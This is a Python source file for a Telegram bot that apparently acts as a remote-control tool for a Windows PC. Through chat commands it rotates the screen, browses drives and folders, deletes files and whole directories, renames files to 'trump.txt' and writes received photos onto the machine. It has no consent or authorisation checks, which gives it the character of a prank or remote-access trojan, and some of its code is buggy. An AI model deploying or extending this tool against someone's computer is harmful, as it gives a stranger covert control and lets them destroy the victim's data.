# bot
import shutil

import numpy
import telebot
from telebot import types
from settings import BOT_TOKEN

# libraries
import win32api
import rotatescreen
import pathlib
from help_functions import get_files_and_dirs_in_directories

# some settings
bot = telebot.TeleBot(BOT_TOKEN, skip_pending=True)
file_location = pathlib.Path.cwd()
travel_path = pathlib.Path.cwd()


@bot.message_handler(commands=["start"])
def start(message, res=False):
    bot.send_message(message.chat.id, 'Init')


'''Screen tricks'''


@bot.message_handler(commands=['rotate_screen'])
def rotate_screen_main_function(message):
    msg = bot.send_message(message.chat.id, "Input degrees count: 0, 90, 180, 270")
    bot.register_next_step_handler(msg, make_rotate)


def make_rotate(message):
    if message.text == 'out':
        bot.send_message(message.chat.id, "Command is closed..")
        return
    try:
        degrees = int(message.text)
        screen = rotatescreen.get_primary_display()
        start_pos = screen.current_orientation
        pos = abs((start_pos - degrees) % 360)
        screen.rotate_to(pos)
        msg = "Successfully"
    except:
        msg = "You can use only 0, 90, 180, 270 degrees!"
    bot.send_message(message.chat.id, msg)


"""Directories travel functions"""


@bot.message_handler(commands=['change_disk'])
def try_to_change_a_disk_in_travel_path(message):
    drives = win32api.GetLogicalDriveStrings()
    drives = drives.split('\000')[:-1]
    if len(drives) < 2:
        bot.send_message(message.chat.id, "This computer has no more than 1 disk")
        return
    text = 'Choose a disk(or use out to leave)\n' + '''\n'''.join(
        [f"{indx} - {disk}" for indx, disk in enumerate(drives)])
    msg = bot.send_message(message.chat.id, text)
    bot.register_next_step_handler(msg, change_disk, drives)


def change_disk(message, disks_list: list):
    global travel_path
    if message.text == 'out':
        bot.send_message(message.text.id, 'Function is closed')
        return
    try:
        potential_disk = disks_list[int(message.text)]
        travel_path = pathlib.Path(potential_disk)
        bot.send_message(message.chat.id, f'You are in {travel_path}!')
    except Exception:
        bot.send_message(message.chat.id, 'Wrong disk index!')


@bot.message_handler(commands=['cd'])
def display_directories_to_go_in(message):
    global travel_path
    directories = get_files_and_dirs_in_directories(travel_path).get('directories')
    bot.send_message(message.chat.id,
                     "Choice path to go and enter it's index(leave from command - 'out', 'parent' - step back")
    text = """"""
    for indx, value in enumerate(directories):
        text += f'{indx} - {value}\n'
    if not text:
        text = """There is no other directories, you can only back to parent!"""
    msg = bot.send_message(message.chat.id, text)
    bot.register_next_step_handler(msg, cd_to_directory, directories)


def cd_to_directory(message, directories: list):
    global travel_path
    path = message.text
    if path == 'out':
        bot.send_message(message.chat.id, 'Command is closed')
        return

    if path == 'parent':
        travel_path = travel_path.parent
        bot.send_message(message.chat.id, f'You are here\n{travel_path}')
    else:
        try:
            travel_path = directories[int(path)]
            bot.send_message(message.chat.id, f'You are here\n{travel_path}')
        except IndexError:
            bot.send_message(message.chat.id, 'Unknown path')

    display_directories_to_go_in(message)


@bot.message_handler(commands=['cd_files'])
def display_files_in_dir(message):
    global travel_path
    if 'dirs' in message.text:
        bot.send_message(message.chat.id, 'You enter to the mode with dirs')
        data = get_files_and_dirs_in_directories(travel_path)
        files = data.get('files') + data.get('directories')
    else:
        files = get_files_and_dirs_in_directories(travel_path).get('files')
    bot.send_message(message.chat.id,
                     "To choose file write it's index. To end write 'out' and to choice another file send 'back'")

    text = """"""
    for indx, file in enumerate(files):
        text += f'{indx} - {file}\n'
    if not text:
        text = f"""There is no files in {travel_path}"""
    msg = bot.send_message(message.chat.id, text)

    bot.register_next_step_handler(msg, actions_with_files, files)


def actions_with_files(message, files):
    path = message.text

    if path == 'out':
        bot.send_message(message.chat.id, 'Command is closed')
        return
    if path == 'back':
        display_files_in_dir(message)
        return

    try:
        file_path = files[int(path)]
        text = """delete
        rename
        back
        """
        msg = bot.send_message(message.chat.id, text)
        bot.register_next_step_handler(msg, make_actions, file_path)
    except:
        bot.send_message(message.chat.id, 'Unknown file!')
        display_files_in_dir(message)


def make_actions(message, file_path):
    action = message.text

    if action == 'out':
        bot.send_message(message.chat.id, 'Command is closed')

    if action == 'back':
        display_files_in_dir(message)
        return

    if 'delete' in action:
        if file_path.is_dir():
            shutil.rmtree(file_path, ignore_errors=True)
        else:
            pathlib.Path.unlink(file_path)
        bot.send_message(message.chat.id, 'File has been deleted')

    if 'rename' in action:
        p = pathlib.Path(file_path)
        p.rename('trump.txt')
        bot.send_message(message.chat.id, 'File has been renamed!')

    display_files_in_dir(message)


@bot.message_handler(commands=['change_wallpaper'])
def accept_user_message_and_request_a_photo(message):
    msg = bot.send_message(message.chat.id, "Send me a photo!")
    bot.register_next_step_handler(msg, change_current_wallpaper)

@bot.message_handler(content_types=['photo'])
def change_current_wallpaper(message):
    global travel_path


    photo = message.photo
    max_file_size = bot.get_file(photo[-1].file_id)
    file = bot.download_file(max_file_size.file_path)
    with open(travel_path, 'wb') as new_file:
        new_file.write(file)



bot.polling(none_stop=True, interval=0)
